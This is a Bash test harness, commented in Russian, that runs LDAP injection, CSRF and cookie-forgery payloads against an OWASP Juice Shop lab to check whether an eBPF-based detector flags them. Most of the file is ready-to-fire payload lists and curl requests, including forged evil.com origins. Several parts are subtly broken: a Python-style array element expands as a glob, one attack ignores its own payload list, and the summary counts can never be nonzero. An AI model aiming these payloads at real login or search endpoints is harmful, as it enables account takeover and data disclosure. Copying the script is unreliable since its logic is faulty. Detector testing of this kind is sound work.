#!/bin/bash
# LDAP Injection и CSRF атаки против OWASP Juice Shop
# Цель: Тестирование способности ebpf-guard детектировать LDAP injection и CSRF атаки

set -e

VPS_IP="${VPS_IP:-localhost}"
JUICE_SH_URL="http://${VPS_IP}:3000"
EBPF_GUARD_API="http://${VPS_IP}:19090"
RESULTS_DIR="./ldap-csrf-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }

mkdir -p "$RESULTS_DIR"

# ========================================
# LDAP INJECTION ATTACKS
# ========================================

# Attack 1: Authentication Bypass via LDAP Injection
attack_ldap_auth_bypass() {
    log "==========================================="
    log "ATTACK 1: LDAP Auth Bypass"
    log "==========================================="

    local output_file="$RESULTS_DIR/ldap_auth_bypass_$TIMESTAMP.txt"

    # LDAP injection payloads для authentication bypass
    local payloads=(
        "*)(uid=*))(|(uid=*"
        "admin*)("
        "*)(uid=1"
        "*"
        "*/*"
        "*|*"
        "*(|(mail=*))"
        "*)(|(cn=*))"
        "*)(userPassword=*"
        "*))%00"
    )

    for payload in "${payloads[@]}"; do
        log "Testing payload: $payload"
        # Попытка через login endpoint
        curl -s -X POST "$JUICE_SH_URL/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$payload\",\"password\":\"test\"}" \
            -o /dev/null -w "Payload '$payload': %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "LDAP auth bypass завершен. Результаты в $output_file"
}

# Attack 2: LDAP Filter Injection
attack_ldap_filter_injection() {
    log "==========================================="
    log "ATTACK 2: LDAP Filter Injection"
    log "==========================================="

    local output_file="$RESULTS_DIR/ldap_filter_$TIMESTAMP.txt"

    # LDAP filter injection payloads
    local filter_payloads=(
        "(cn=*)(objectClass=*)(userPassword=*))"
        "(&(objectClass=*)(uid=*))"
        "(|(cn=*))(uid=*))"
        "(&(cn=*)(|(cn=*)))"
        "*)%00"
        "*)(uid=*%00"
        "*(|(password=*)))"
        "(&(cn=*)(userPassword=*))"
    )

    # Попытка через search/user endpoints
    for payload in "${filter_payloads[@]}"; do
        log "Testing filter: $payload"
        curl -s -X GET "$JUICE_SH_URL/rest/user/search?q=$payload" \
            -H "Content-Type: application/json" \
            -o /dev/null -w "Filter '$payload': %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "LDAP filter injection завершен. Результаты в $output_file"
}

# Attack 3: LDAP Attribute Disclosure
attack_ldap_attribute_disclosure() {
    log "==========================================="
    log "ATTACK 3: LDAP Attribute Disclosure"
    log "==========================================="

    local output_file="$RESULTS_DIR/ldap_disclosure_$TIMESTAMP.txt"

    # Попытки извлечения атрибутов
    local attributes=(
        "uid"
        "cn"
        "mail"
        "userPassword"
        "displayName"
        "givenName"
        "sn"
        "telephoneNumber"
        "memberof"
        "objectClass"
    )

    for attr in "${attributes[@]}"; do
        log "Testing attribute: $attr"
        curl -s -X GET "$JUICE_SH_URL/rest/user/search?q=*)(${attr}=*" \
            -H "Content-Type: application/json" \
            -o /dev/null -w "Attribute '$attr': %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "LDAP attribute disclosure завершен. Результаты в $output_file"
}

# Attack 4: LDAP Blind Injection
attack_ldap_blind() {
    log "==========================================="
    log "ATTACK 4: LDAP Blind Injection"
    log "==========================================="

    local output_file="$RESULTS_DIR/ldap_blind_$TIMESTAMP.txt"

    # Blind LDAP injection payloads
    local blind_payloads=(
        "*)(uid=*))%00pass"
        "*)(|(cn=*))%00"
        "*)(|(objectClass=*)))%00"
        "*))%00"
        "*|(objectClass=*"
        "*(|(cn=*))*(|(cn=*"
    )

    for payload in "${blind_payloads[@]}"; do
        log "Testing blind payload: $payload"
        curl -s -X POST "$JUICE_SH_URL/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$payload\",\"password\":\"anything\"}" \
            -o /dev/null -w "Blind: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.1
    done

    log "LDAP blind injection завершен. Результаты в $output_file"
}

# ========================================
# CSRF ATTACKS
# ========================================

# Attack 5: CSRF Token Enumeration
attack_csrf_enumeration() {
    log "==========================================="
    log "ATTACK 5: CSRF Token Enumeration"
    log "==========================================="

    local output_file="$RESULTS_DIR/csrf_enumeration_$TIMESTAMP.txt"

    # Попытки найти CSRF токены
    local endpoints=(
        "/rest/user/login"
        "/rest/user/register"
        "/rest/basket/"
        "/rest/feedback/"
        "/rest/challenges/"
    )

    for endpoint in "${endpoints[@]}"; do
        log "Testing endpoint: $endpoint"
        curl -s -X GET "$JUICE_SH_URL$endpoint" \
            -H "Content-Type: application/json" \
            -D - -o /dev/null \
            >> "$output_file" 2>&1
        sleep 0.05
    done

    log "CSRF enumeration завершен. Результаты в $output_file"
}

# Attack 6: CSRF Token Prediction/Bypass
attack_csrf_bypass() {
    log "==========================================="
    log "ATTACK 6: CSRF Token Bypass"
    log "==========================================="

    local output_file="$RESULTS_DIR/csrf_bypass_$TIMESTAMP.txt"

    # Попытки отправить запросы без CSRF токена или с фальшивыми
    local fake_tokens=(
        ""
        "null"
        "undefined"
        "123456789"
        "abcdefgh"
        "test-token"
        "a" * 64
    )

    for token in "${fake_tokens[@]}"; do
        log "Testing with token: '$token'"
        curl -s -X POST "$JUICE_SH_URL/rest/basket/" \
            -H "Content-Type: application/json" \
            -H "X-CSRF-Token: $token" \
            -d "{\"productId\":1,\"quantity\":1,\"basketId\":1}" \
            -o /dev/null -w "Token '$token': %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.05
    done

    log "CSRF bypass завершен. Результаты в $output_file"
}

# Attack 7: Cross-Site Request Forgery (state-changing)
attack_csrf_state_change() {
    log "==========================================="
    log "ATTACK 7: CSRF State Change"
    log "==========================================="

    local output_file="$RESULTS_DIR/csrf_state_$TIMESTAMP.txt"

    # Попытки изменить состояние без proper CSRF protection
    local state_changes=(
        # Change password
        '{"url":"/rest/user/change-password","method":"POST","data":{"new":"password123","old":"wrong","repeat":"password123"}}'
        # Add to basket
        '{"url":"/rest/basket/","method":"POST","data":{"productId":1,"quantity":999,"basketId":1}}'
        # Submit feedback
        '{"url":"/rest/feedback/","method":"POST","data":{"comment":"CSRF test","rating":5}}'
        # Update user
        '{"url":"/rest/user/","method":"PUT","data":{"email":"hacked@test.com","password":"test123"}}'
    )

    for change in "${state_changes[@]}"; do
        log "Testing state change: $change"
        # Имитация запроса от другого origin (без proper headers)
        curl -s -X POST "$JUICE_SH_URL/rest/basket/" \
            -H "Content-Type: application/json" \
            -H "Origin: http://evil.com" \
            -H "Referer: http://evil.com/attack.html" \
            -d "{\"productId\":1,\"quantity\":999}" \
            -o /dev/null -w "Evil origin: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.05
    done

    log "CSRF state change завершен. Результаты в $output_file"
}

# Attack 8: Header-based CSRF bypass attempts
attack_csrf_header_bypass() {
    log "==========================================="
    log "ATTACK 8: Header-based CSRF Bypass"
    log "==========================================="

    local output_file="$RESULTS_DIR/csrf_headers_$TIMESTAMP.txt"

    # Попытки через custom headers
    local header_combinations=(
        "X-Requested-With: XMLHttpRequest"
        "X-CSRF-Token: bypass"
        "X-HTTP-Method-Override: DELETE"
    )

    for headers in "${header_combinations[@]}"; do
        log "Testing headers: $headers"
        curl -s -X POST "$JUICE_SH_URL/rest/user/change-password" \
            -H "Content-Type: application/json" \
            -H "$headers" \
            -d '{"new":"password123","old":"wrong","repeat":"password123"}' \
            -o /dev/null -w "Headers: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.05
    done

    log "Header-based CSRF bypass завершен. Результаты в $output_file"
}

# Attack 9: Session manipulation
attack_session_manipulation() {
    log "==========================================="
    log "ATTACK 9: Session Manipulation"
    log "==========================================="

    local output_file="$RESULTS_DIR/session_manipulation_$TIMESTAMP.txt"

    # Попытки манипуляции сессиями
    local session_attacks=(
        "session=admin123"
        "sessionid=administrator"
        "session_token=bypass"
        "jsession=exploit"
        "sid=1"
    )

    for attack in "${session_attacks[@]}"; do
        log "Testing session: $attack"
        curl -s -X GET "$JUICE_SH_URL/rest/user/whoami" \
            -H "Cookie: $attack" \
            -o /dev/null -w "Session '$attack': %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.05
    done

    log "Session manipulation завершен. Результаты в $output_file"
}

# Анализ результатов
analyze_results() {
    log "==========================================="
    log "АНАЛИЗ LDAP/CSRF АТАК"
    log "==========================================="

    local summary_file="$RESULTS_DIR/summary-$TIMESTAMP.txt"

    {
        echo "LDAP/CSRF ATTACK SUMMARY - $TIMESTAMP"
        echo "========================================"
        echo ""

        echo "=== LDAP ATTACKS ==="
        local ldap_files=(localhost_scan filter disclosure blind)
        for file in "$RESULTS_DIR"/ldap_*.txt; do
            if [ -f "$file" ]; then
                local count=$(grep -c "http_code" "$file" 2>/dev/null || echo 0)
                echo "$(basename $file): $count attempts"
            fi
        done

        echo ""
        echo "=== CSRF ATTACKS ==="
        for file in "$RESULTS_DIR"/csrf_*.txt; do
            if [ -f "$file" ]; then
                local count=$(grep -c "http_code" "$file" 2>/dev/null || echo 0)
                echo "$(basename $file): $count attempts"
            fi
        done

        echo ""
        echo "=== LDAP/CSRF-RELATED METRICS ==="
        curl -s "$EBPF_GUARD_API/metrics" | grep -E "ldap|csrf|session|token" || echo "No LDAP/CSRF metrics found"

        echo ""
        echo "=== RELATED ALERTS ==="
        curl -s "$EBPF_GUARD_API/alerts" | grep -iE "ldap|csrf|session|token" | head -20 || echo "No LDAP/CSRF alerts found"

    } | tee "$summary_file"

    log "Summary сохранен в $summary_file"
}

# Главная функция
main() {
    log "==========================================="
    log "LDAP/CSRF AUTOMATION AGAINST JUICE SHOP"
    log "==========================================="
    log "Juice Shop URL: $JUICE_SH_URL"
    log "ebpf-guard API: $EBPF_GUARD_API"
    log "Results dir: $RESULTS_DIR"
    log "==========================================="

    # LDAP атаки
    attack_ldap_auth_bypass
    attack_ldap_filter_injection
    attack_ldap_attribute_disclosure
    attack_ldap_blind

    # CSRF атаки
    attack_csrf_enumeration
    attack_csrf_bypass
    attack_csrf_state_change
    attack_csrf_header_bypass
    attack_session_manipulation

    analyze_results

    log "==========================================="
    log "ВСЕ LDAP/CSRF АТАКИ ЗАВЕРШЕНЫ"
    log "==========================================="
    log "Результаты сохранены в: $RESULTS_DIR"
}

# Запуск
main "$@"
